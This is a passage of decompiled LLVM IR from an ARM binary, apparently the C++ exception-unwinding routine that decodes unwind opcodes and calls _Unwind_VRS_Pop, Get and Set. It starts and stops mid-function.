  store i32 %v4_1883c, i32* %r3.global-to-local, align 4
  %v2_18840 = icmp eq i8 %v3_1883c, 0
  store i1 %v2_18840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18840, label %dec_label_pc_1887c, label %dec_label_pc_1884c

dec_label_pc_1884c:                               ; preds = %dec_label_pc_1883c
  %v1_1884c = add nsw i32 %v4_1883c, -1
  store i32 %v1_1884c, i32* %r3.global-to-local, align 4
  %v1_18850 = trunc i32 %v1_1884c to i8
  store i8 %v1_18850, i8* %v2_1883c, align 1
  %v0_18854 = load i32, i32* @r5, align 4
  %v1_18854 = add i32 %v0_18854, 4
  %v2_18854 = inttoptr i32 %v1_18854 to i32*
  %v3_18854 = load i32, i32* %v2_18854, align 4
  store i32 %v3_18854, i32* %r2.global-to-local, align 4
  %v1_18858 = inttoptr i32 %v3_18854 to i32*
  %v2_18858 = load i32, i32* %v1_18858, align 4
  store i32 %v2_18858, i32* %r0.global-to-local, align 4
  %v4_18858 = add i32 %v3_18854, 4
  store i32 %v4_18858, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18858, i32* %v2_18854, align 4
  %v0_18864 = load i32, i32* %r3.global-to-local, align 4
  %v1_18864 = trunc i32 %v0_18864 to i8
  %v2_18864 = load i32, i32* @r5, align 4
  %v3_18864 = add i32 %v2_18864, 8
  %v4_18864 = inttoptr i32 %v3_18864 to i8*
  store i8 %v1_18864, i8* %v4_18864, align 1
  %v0_18868 = load i32, i32* %r0.global-to-local, align 4
  %v1_18868 = load i32, i32* @r5, align 4
  %v2_18868 = inttoptr i32 %v1_18868 to i32*
  store i32 %v0_18868, i32* %v2_18868, align 4
  br label %dec_label_pc_1886c

dec_label_pc_1886c:                               ; preds = %.thread3, %dec_label_pc_1884c
  %v0_1886c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1886c, i32* %r3.global-to-local, align 4
  %v3_18870 = mul i32 %v0_1886c, 256
  store i32 %v3_18870, i32* %r0.global-to-local, align 4
  %v1_18874 = load i32, i32* @r5, align 4
  %v2_18874 = inttoptr i32 %v1_18874 to i32*
  store i32 %v3_18870, i32* %v2_18874, align 4
  %v0_18878 = load i32, i32* %r3.global-to-local, align 4
  %v3_18878 = udiv i32 %v0_18878, 16777216
  br label %dec_label_pc_1887c

dec_label_pc_1887c:                               ; preds = %dec_label_pc_1883c, %dec_label_pc_1886c
  %storemerge133 = phi i32 [ %v3_18878, %dec_label_pc_1886c ], [ 176, %dec_label_pc_1883c ]
  %v1_1887c = load i32, i32* %ip.global-to-local, align 4
  %v4_1887c = mul i32 %v1_1887c, 256
  %v5_1887c = or i32 %v4_1887c, %storemerge133
  store i32 %v5_1887c, i32* %r2.global-to-local, align 4
  %v7_18880 = icmp eq i32 %v5_1887c, 32768
  store i1 %v7_18880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18880, label %dec_label_pc_18a8c, label %dec_label_pc_18888

dec_label_pc_18888:                               ; preds = %dec_label_pc_1887c
  %v3_18888 = mul i32 %v5_1887c, 16
  store i32 %v3_18888, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18898 = and i32 %v3_18888, 65520
  store i32 %v3_18898, i32* %r2.global-to-local, align 4
  %v0_1889c = load i32, i32* @r7, align 4
  store i32 %v0_1889c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_188a4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1889c, i32 %v3_18898, i32 0, i32 0)
  store i32 %v4_188a4, i32* %r0.global-to-local, align 4
  %v2_188a8 = icmp eq i32 %v4_188a4, 0
  store i1 %v2_188a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188a8, label %dec_label_pc_188b0, label %dec_label_pc_18a8c

dec_label_pc_188b0:                               ; preds = %dec_label_pc_18888
  %v0_188b0 = load i32, i32* @r5, align 4
  %v1_188b0 = add i32 %v0_188b0, 8
  %v2_188b0 = inttoptr i32 %v1_188b0 to i8*
  %v3_188b0 = load i8, i8* %v2_188b0, align 1
  %v4_188b0 = zext i8 %v3_188b0 to i32
  store i32 %v4_188b0, i32* %r3.global-to-local, align 4
  %v0_188b4 = load i32, i32* @r4, align 4
  %v1_188b4 = and i32 %v0_188b4, 32768
  %v2_188b4 = icmp eq i32 %v1_188b4, 0
  store i1 %v2_188b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188b4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_188b0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_188b0, %bb147
  %v2_188bc = icmp eq i8 %v3_188b0, 0
  store i1 %v2_188bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188bc, label %dec_label_pc_188cc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_188c0 = add nsw i32 %v4_188b0, -1
  store i32 %v2_188c0, i32* %r3.global-to-local, align 4
  %v2_188c4 = trunc i32 %v2_188c0 to i8
  store i8 %v2_188c4, i8* %v2_188b0, align 1
  %v0_188c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188c8.pr.pr, label %.thread6.dec_label_pc_188cc_crit_edge, label %dec_label_pc_187f8

.thread6.dec_label_pc_188cc_crit_edge:            ; preds = %.thread6
  %v0_188cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_188cc

dec_label_pc_188cc:                               ; preds = %bb148, %.thread6.dec_label_pc_188cc_crit_edge
  %v0_188cc = phi i32 [ %v0_188cc.pre, %.thread6.dec_label_pc_188cc_crit_edge ], [ %v0_188b0, %bb148 ]
  %v1_188cc = add i32 %v0_188cc, 9
  %v2_188cc = inttoptr i32 %v1_188cc to i8*
  %v3_188cc = load i8, i8* %v2_188cc, align 1
  %v4_188cc = zext i8 %v3_188cc to i32
  store i32 %v4_188cc, i32* %r3.global-to-local, align 4
  %v2_188d0 = icmp eq i8 %v3_188cc, 0
  store i1 %v2_188d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188d0, label %dec_label_pc_188d8, label %dec_label_pc_187dc

dec_label_pc_188d8:                               ; preds = %dec_label_pc_188cc, %dec_label_pc_187d0, %dec_label_pc_187f8
  %v0_188d8 = load i32, i32* @sl, align 4
  %v2_188d8 = icmp eq i32 %v0_188d8, 0
  store i1 %v2_188d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188d8, label %dec_label_pc_189a0, label %bb149

bb149:                                            ; preds = %dec_label_pc_188d8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_188e4:                               ; preds = %bb149, %dec_label_pc_18e54, %dec_label_pc_18cf4, %dec_label_pc_18b18, %dec_label_pc_18ad0, %dec_label_pc_18a8c, %dec_label_pc_189a0
  %v1_188ec = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_18e54 ], [ 9, %dec_label_pc_18cf4 ], [ 9, %dec_label_pc_18b18 ], [ 9, %dec_label_pc_18ad0 ], [ 9, %dec_label_pc_18a8c ], [ %v0_189d4, %dec_label_pc_189a0 ]
  store i32 %v9_187a8, i32* %r6.global-to-local, align 4
  store i32 %v21_187a8, i32* @lr, align 4
  ret i32 %v1_188ec

dec_label_pc_188f0:                               ; preds = %dec_label_pc_18814
  %v1_188f0 = mul i32 %v0_18814, 4
  %v3_188f4 = and i32 %v1_188f0, 252
  store i32 %v3_188f4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18900 = load i32, i32* @r7, align 4
  store i32 %v0_18900, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18908 = add nuw nsw i32 %v3_188f4, 4
  store i32 %v1_18908, i32* %r6.global-to-local, align 4
  %v5_18910 = call i32 @_Unwind_VRS_Get(i32 %v0_18900, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18914 = load i32, i32* @r4, align 4
  %v1_18914 = and i32 %v0_18914, 64
  %v2_18914 = icmp eq i32 %v1_18914, 0
  store i1 %v2_18914, i1* %cpsr_z.global-to-local, align 1
  %v4_1891c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18928 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18928
  %storemerge160.p = select i1 %v2_18914, i32 %v2_18928, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1891c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18944 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187bc.backedge

dec_label_pc_187bc.backedge:                      ; preds = %dec_label_pc_188f0, %dec_label_pc_1896c, %dec_label_pc_18df0, %dec_label_pc_18abc, %dec_label_pc_18af4, %dec_label_pc_18a74, %dec_label_pc_18ce0
  %v0_187bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_187bc

dec_label_pc_1894c:                               ; preds = %dec_label_pc_1881c
  %v7_1894c = icmp eq i32 %v1_1881c, 144
  store i1 %v7_1894c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1894c, label %dec_label_pc_18954, label %dec_label_pc_18a94

dec_label_pc_18954:                               ; preds = %dec_label_pc_1894c
  %v1_18954 = urem i32 %v0_18814, 16
  store i32 %v1_18954, i32* %r2.global-to-local, align 4
  %v2_18958 = icmp eq i32 %v1_18954, 15
  store i1 %v2_18958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18958, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18954
  %v8_1895c = icmp eq i32 %v1_18954, 13
  store i1 %v8_1895c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1895c, label %bb154, label %dec_label_pc_1896c

.thread21:                                        ; preds = %dec_label_pc_18954
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18a8c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18a8c

dec_label_pc_1896c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18978 = load i32, i32* @r7, align 4
  store i32 %v0_18978, i32* %r0.global-to-local, align 4
  %v5_18980 = call i32 @_Unwind_VRS_Get(i32 %v0_18978, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18988 = load i32, i32* @r7, align 4
  store i32 %v0_18988, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18998 = call i32 @_Unwind_VRS_Set(i32 %v0_18988, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18998, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187bc.backedge

dec_label_pc_189a0:                               ; preds = %dec_label_pc_188d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_189b0 = load i32, i32* @r7, align 4
  store i32 %v0_189b0, i32* %r0.global-to-local, align 4
  %v7_189b8 = call i32 @_Unwind_VRS_Get(i32 %v0_189b0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_189bc = load i32, i32* @r7, align 4
  store i32 %v0_189bc, i32* %r0.global-to-local, align 4
  %v0_189c0 = load i32, i32* @sl, align 4
  store i32 %v0_189c0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_189c0, i32* %r3.global-to-local, align 4
  %v5_189d0 = call i32 @_Unwind_VRS_Set(i32 %v0_189bc, i32 %v0_189c0, i32 15, i32 %v0_189c0, i8* bitcast (i32* @0 to i8*))
  %v0_189d4 = load i32, i32* @sl, align 4
  store i32 %v0_189d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_189dc:                               ; preds = %dec_label_pc_18bd0
  %v7_189dc = icmp eq i32 %v0_18bd0, 199
  store i1 %v7_189dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_189dc, label %dec_label_pc_18cb0, label %dec_label_pc_189e4

dec_label_pc_189e4:                               ; preds = %dec_label_pc_189dc
  %v1_189e4 = and i32 %v0_18814, 248
  store i32 %v1_189e4, i32* %r3.global-to-local, align 4
  %v7_189e8 = icmp eq i32 %v1_189e4, 192
  store i1 %v7_189e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_189e8, label %.thread24, label %dec_label_pc_18a00

.thread24:                                        ; preds = %dec_label_pc_189e4
  %v2_189ec = urem i32 %v0_18814, 16
  %v2_189f0 = add nuw nsw i32 %v2_189ec, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_189f8 = or i32 %v2_189f0, 655360
  store i32 %v2_189f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18a00:                               ; preds = %dec_label_pc_189e4
  %v7_18a00 = icmp eq i32 %v0_18bd0, 200
  store i1 %v7_18a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a00, label %dec_label_pc_18c44, label %dec_label_pc_18a08

dec_label_pc_18a08:                               ; preds = %dec_label_pc_18a00
  %v7_18a08 = icmp eq i32 %v0_18bd0, 201
  store i1 %v7_18a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a08, label %dec_label_pc_18a10, label %dec_label_pc_18a8c

dec_label_pc_18a10:                               ; preds = %dec_label_pc_18a08
  %v0_18a10 = load i32, i32* @r5, align 4
  %v1_18a10 = add i32 %v0_18a10, 8
  %v2_18a10 = inttoptr i32 %v1_18a10 to i8*
  %v3_18a10 = load i8, i8* %v2_18a10, align 1
  %v4_18a10 = zext i8 %v3_18a10 to i32
  store i32 %v4_18a10, i32* %r3.global-to-local, align 4
  %v2_18a14 = icmp eq i8 %v3_18a10, 0
  store i1 %v2_18a14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a14, label %dec_label_pc_18a24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_18a10
  %v2_18a18 = add nsw i32 %v4_18a10, -1
  store i32 %v2_18a18, i32* %r3.global-to-local, align 4
  %v2_18a1c = trunc i32 %v2_18a18 to i8
  store i8 %v2_18a1c, i8* %v2_18a10, align 1
  %v0_18a20.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a20.pr.pr, label %.thread26.dec_label_pc_18a24_crit_edge, label %dec_label_pc_18a58

.thread26.dec_label_pc_18a24_crit_edge:           ; preds = %.thread26
  %v0_18a24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %.thread26.dec_label_pc_18a24_crit_edge, %dec_label_pc_18a10
  %v2_18a3c = phi i32 [ %v0_18a24.pre, %.thread26.dec_label_pc_18a24_crit_edge ], [ %v0_18a10, %dec_label_pc_18a10 ]
  %v1_18a24 = add i32 %v2_18a3c, 9
  %v2_18a24 = inttoptr i32 %v1_18a24 to i8*
  %v3_18a24 = load i8, i8* %v2_18a24, align 1
  %v4_18a24 = zext i8 %v3_18a24 to i32
  store i32 %v4_18a24, i32* %r3.global-to-local, align 4
  %v2_18a28 = icmp eq i8 %v3_18a24, 0
  store i1 %v2_18a28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a28, label %dec_label_pc_18a74, label %dec_label_pc_18a38

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18a24
  %v1_18a38 = add nsw i32 %v4_18a24, -1
  store i32 %v1_18a38, i32* %r3.global-to-local, align 4
  %v1_18a3c = trunc i32 %v1_18a38 to i8
  store i8 %v1_18a3c, i8* %v2_18a24, align 1
  %v0_18a40 = load i32, i32* @r5, align 4
  %v1_18a40 = add i32 %v0_18a40, 4
  %v2_18a40 = inttoptr i32 %v1_18a40 to i32*
  %v3_18a40 = load i32, i32* %v2_18a40, align 4
  store i32 %v3_18a40, i32* %r2.global-to-local, align 4
  %v1_18a44 = inttoptr i32 %v3_18a40 to i32*
  %v2_18a44 = load i32, i32* %v1_18a44, align 4
  store i32 %v2_18a44, i32* %r0.global-to-local, align 4
  %v4_18a44 = add i32 %v3_18a40, 4
  store i32 %v4_18a44, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18a44, i32* %v2_18a40, align 4
  %v0_18a50 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a50 = trunc i32 %v0_18a50 to i8
  %v2_18a50 = load i32, i32* @r5, align 4
  %v3_18a50 = add i32 %v2_18a50, 8
  %v4_18a50 = inttoptr i32 %v3_18a50 to i8*
  store i8 %v1_18a50, i8* %v4_18a50, align 1
  %v0_18a54 = load i32, i32* %r0.global-to-local, align 4
  %v1_18a54 = load i32, i32* @r5, align 4
  %v2_18a54 = inttoptr i32 %v1_18a54 to i32*
  store i32 %v0_18a54, i32* %v2_18a54, align 4
  br label %dec_label_pc_18a58

dec_label_pc_18a58:                               ; preds = %.thread26, %dec_label_pc_18a38
  %v0_18a58 = load i32, i32* %r0.global-to-local, align 4
  %v3_18a58 = udiv i32 %v0_18a58, 16777216
  %v1_18a5c = urem i32 %v3_18a58, 16
  %v3_18a60 = mul i32 %v0_18a58, 256
  %v1_18a64 = add nuw nsw i32 %v1_18a5c, 1
  store i32 %v1_18a64, i32* %r1.global-to-local, align 4
  %v1_18a68 = and i32 %v3_18a58, 240
  store i32 %v1_18a68, i32* %r3.global-to-local, align 4
  %v1_18a6c = load i32, i32* @r5, align 4
  %v2_18a6c = inttoptr i32 %v1_18a6c to i32*
  store i32 %v3_18a60, i32* %v2_18a6c, align 4
  %v0_18a70 = load i32, i32* %r1.global-to-local, align 4
  %v1_18a70 = load i32, i32* %r3.global-to-local, align 4
  %v4_18a70 = mul i32 %v1_18a70, 4096
  %v5_18a70 = or i32 %v4_18a70, %v0_18a70
  br label %dec_label_pc_18a74

dec_label_pc_18a74:                               ; preds = %dec_label_pc_18a24, %dec_label_pc_18a58
  %storemerge = phi i32 [ %v5_18a70, %dec_label_pc_18a58 ], [ 720897, %dec_label_pc_18a24 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18a74 = load i32, i32* @r7, align 4
  store i32 %v0_18a74, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18a80 = call i32 @_Unwind_VRS_Pop(i32 %v0_18a74, i32 1, i32 5, i32 5)
  store i32 %v4_18a80, i32* %r0.global-to-local, align 4
  %v2_18a84 = icmp eq i32 %v4_18a80, 0
  store i1 %v2_18a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a84, label %dec_label_pc_187bc.backedge, label %dec_label_pc_18a8c

dec_label_pc_18a8c:                               ; preds = %dec_label_pc_18cd8, %dec_label_pc_18a08, %dec_label_pc_18ae8, %dec_label_pc_18e8c, %dec_label_pc_18e5c, %dec_label_pc_18e38, %dec_label_pc_18cc4, %dec_label_pc_18a74, %dec_label_pc_18888, %dec_label_pc_1887c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_18a94:                               ; preds = %dec_label_pc_1894c
  %v7_18a94 = icmp eq i32 %v1_1881c, 160
  store i1 %v7_18a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a94, label %dec_label_pc_18a9c, label %dec_label_pc_18ad8

dec_label_pc_18a9c:                               ; preds = %dec_label_pc_18a94
  %v0_18a9c = load i32, i32* %ip.global-to-local, align 4
  %v1_18a9c = urem i32 %v0_18a9c, 8
  %v1_18aa0 = xor i32 %v1_18a9c, 7
  store i32 %v1_18aa0, i32* %r3.global-to-local, align 4
  %v6_18aa8 = lshr i32 4080, %v1_18aa0
  %v1_18aac = and i32 %v0_18814, 8
  %v2_18aac = icmp eq i32 %v1_18aac, 0
  store i1 %v2_18aac, i1* %cpsr_z.global-to-local, align 1
  %v1_18ab0 = and i32 %v6_18aa8, 4080
  %tmp155 = mul nuw nsw i32 %v1_18aac, 2048
  %tmp156 = or i32 %v1_18ab0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18abc:                               ; preds = %.thread44, %.thread24, %dec_label_pc_18e4c.dec_label_pc_18abc_crit_edge, %bb157, %dec_label_pc_18ca8, %dec_label_pc_18c3c, %dec_label_pc_18b9c, %dec_label_pc_18a9c
  %v2_18ac4 = phi i32 [ %v2_18bc0, %.thread44 ], [ %v2_18bc8, %bb157 ], [ %v2_18ac4.pre, %dec_label_pc_18e4c.dec_label_pc_18abc_crit_edge ], [ %v2_189f8, %.thread24 ], [ %storemerge130, %dec_label_pc_18ca8 ], [ %storemerge131, %dec_label_pc_18c3c ], [ %storemerge132, %dec_label_pc_18b9c ], [ %tmp156, %dec_label_pc_18a9c ]
  %v0_18ac0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_18e4c.dec_label_pc_18abc_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18ca8 ], [ 3, %dec_label_pc_18c3c ], [ 1, %dec_label_pc_18b9c ], [ 0, %dec_label_pc_18a9c ]
  %v0_18abc = load i32, i32* @r7, align 4
  store i32 %v0_18abc, i32* %r0.global-to-local, align 4
  store i32 %v0_18ac0, i32* %r3.global-to-local, align 4
  %v4_18ac4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18abc, i32 %v0_18ac0, i32 %v2_18ac4, i32 %v0_18ac0)
  store i32 %v4_18ac4, i32* %r0.global-to-local, align 4
  %v2_18ac8 = icmp eq i32 %v4_18ac4, 0
  store i1 %v2_18ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ac8, label %dec_label_pc_187bc.backedge, label %dec_label_pc_18ad0

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_18abc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_18ad8:                               ; preds = %dec_label_pc_18a94
  %v7_18ad8 = icmp eq i32 %v1_1881c, 176
  store i1 %v7_18ad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ad8, label %dec_label_pc_18b20, label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18ad8
  %v7_18ae0 = icmp eq i32 %v1_1881c, 192
  store i1 %v7_18ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ae0, label %dec_label_pc_18bd0, label %dec_label_pc_18ae8

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18ae0
  %v1_18ae8 = and i32 %v0_18814, 248
  store i32 %v1_18ae8, i32* %r3.global-to-local, align 4
  %v7_18aec = icmp eq i32 %v1_18ae8, 208
  store i1 %v7_18aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18aec, label %dec_label_pc_18af4, label %dec_label_pc_18a8c

dec_label_pc_18af4:                               ; preds = %dec_label_pc_18ae8
  %v1_18af4 = urem i32 %v0_18814, 8
  %v1_18af8 = add nuw nsw i32 %v1_18af4, 1
  %v1_18afc = or i32 %v1_18af8, 524288
  store i32 %v1_18afc, i32* %r2.global-to-local, align 4
  %v0_18b00 = load i32, i32* @r7, align 4
  store i32 %v0_18b00, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18b0c = call i32 @_Unwind_VRS_Pop(i32 %v0_18b00, i32 1, i32 %v1_18afc, i32 5)
  store i32 %v4_18b0c, i32* %r0.global-to-local, align 4
  %v2_18b10 = icmp eq i32 %v4_18b0c, 0
  store i1 %v2_18b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b10, label %dec_label_pc_187bc.backedge, label %dec_label_pc_18b18

dec_label_pc_18b18:                               ; preds = %dec_label_pc_18af4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_18b20:                               ; preds = %dec_label_pc_18ad8
  %v0_18b20 = load i32, i32* %ip.global-to-local, align 4
  %v7_18b20 = icmp eq i32 %v0_18b20, 177
  store i1 %v7_18b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b20, label %dec_label_pc_18e24, label %dec_label_pc_18b28

dec_label_pc_18b28:                               ; preds = %dec_label_pc_18b20
  %v7_18b28 = icmp eq i32 %v0_18b20, 178
  store i1 %v7_18b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b28, label %dec_label_pc_18cfc, label %dec_label_pc_18b30

dec_label_pc_18b30:                               ; preds = %dec_label_pc_18b28
  %v7_18b30 = icmp eq i32 %v0_18b20, 179
  store i1 %v7_18b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b30, label %dec_label_pc_18b38, label %dec_label_pc_18ba4

dec_label_pc_18b38:                               ; preds = %dec_label_pc_18b30
  %v0_18b38 = load i32, i32* @r5, align 4
  %v1_18b38 = add i32 %v0_18b38, 8
  %v2_18b38 = inttoptr i32 %v1_18b38 to i8*
  %v3_18b38 = load i8, i8* %v2_18b38, align 1
  %v4_18b38 = zext i8 %v3_18b38 to i32
  store i32 %v4_18b38, i32* %r3.global-to-local, align 4
  %v2_18b3c = icmp eq i8 %v3_18b38, 0
  store i1 %v2_18b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b3c, label %dec_label_pc_18b4c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_18b38
  %v2_18b40 = add nsw i32 %v4_18b38, -1
  store i32 %v2_18b40, i32* %r3.global-to-local, align 4
  %v2_18b44 = trunc i32 %v2_18b40 to i8
  store i8 %v2_18b44, i8* %v2_18b38, align 1
  %v0_18b48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b48.pr.pr, label %.thread30.dec_label_pc_18b4c_crit_edge, label %dec_label_pc_18b80

.thread30.dec_label_pc_18b4c_crit_edge:           ; preds = %.thread30
  %v0_18b4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b4c

dec_label_pc_18b4c:                               ; preds = %.thread30.dec_label_pc_18b4c_crit_edge, %dec_label_pc_18b38
  %v2_18b64 = phi i32 [ %v0_18b4c.pre, %.thread30.dec_label_pc_18b4c_crit_edge ], [ %v0_18b38, %dec_label_pc_18b38 ]
  %v1_18b4c = add i32 %v2_18b64, 9
  %v2_18b4c = inttoptr i32 %v1_18b4c to i8*
  %v3_18b4c = load i8, i8* %v2_18b4c, align 1
  %v4_18b4c = zext i8 %v3_18b4c to i32
  store i32 %v4_18b4c, i32* %r3.global-to-local, align 4
  %v2_18b50 = icmp eq i8 %v3_18b4c, 0
  store i1 %v2_18b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b50, label %dec_label_pc_18b9c, label %dec_label_pc_18b60

dec_label_pc_18b60:                               ; preds = %dec_label_pc_18b4c
  %v1_18b60 = add nsw i32 %v4_18b4c, -1
  store i32 %v1_18b60, i32* %r3.global-to-local, align 4
  %v1_18b64 = trunc i32 %v1_18b60 to i8
  store i8 %v1_18b64, i8* %v2_18b4c, align 1
  %v0_18b68 = load i32, i32* @r5, align 4
  %v1_18b68 = add i32 %v0_18b68, 4
  %v2_18b68 = inttoptr i32 %v1_18b68 to i32*
  %v3_18b68 = load i32, i32* %v2_18b68, align 4
  store i32 %v3_18b68, i32* %r2.global-to-local, align 4
  %v1_18b6c = inttoptr i32 %v3_18b68 to i32*
  %v2_18b6c = load i32, i32* %v1_18b6c, align 4
  store i32 %v2_18b6c, i32* %r0.global-to-local, align 4
  %v4_18b6c = add i32 %v3_18b68, 4
  store i32 %v4_18b6c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18b6c, i32* %v2_18b68, align 4
  %v0_18b78 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b78 = trunc i32 %v0_18b78 to i8
  %v2_18b78 = load i32, i32* @r5, align 4
  %v3_18b78 = add i32 %v2_18b78, 8
  %v4_18b78 = inttoptr i32 %v3_18b78 to i8*
  store i8 %v1_18b78, i8* %v4_18b78, align 1
  %v0_18b7c = load i32, i32* %r0.global-to-local, align 4
  %v1_18b7c = load i32, i32* @r5, align 4
  %v2_18b7c = inttoptr i32 %v1_18b7c to i32*
  store i32 %v0_18b7c, i32* %v2_18b7c, align 4
  br label %dec_label_pc_18b80

dec_label_pc_18b80:                               ; preds = %.thread30, %dec_label_pc_18b60
  %v0_18b80 = load i32, i32* %r0.global-to-local, align 4
  %v3_18b80 = udiv i32 %v0_18b80, 16777216
  %v1_18b84 = urem i32 %v3_18b80, 16
  %v3_18b88 = mul i32 %v0_18b80, 256
  store i32 %v3_18b88, i32* %r0.global-to-local, align 4
  %v1_18b8c = add nuw nsw i32 %v1_18b84, 1
  store i32 %v1_18b8c, i32* %r2.global-to-local, align 4
  %v1_18b90 = and i32 %v3_18b80, 240
  store i32 %v1_18b90, i32* %r3.global-to-local, align 4
  %v1_18b94 = load i32, i32* @r5, align 4
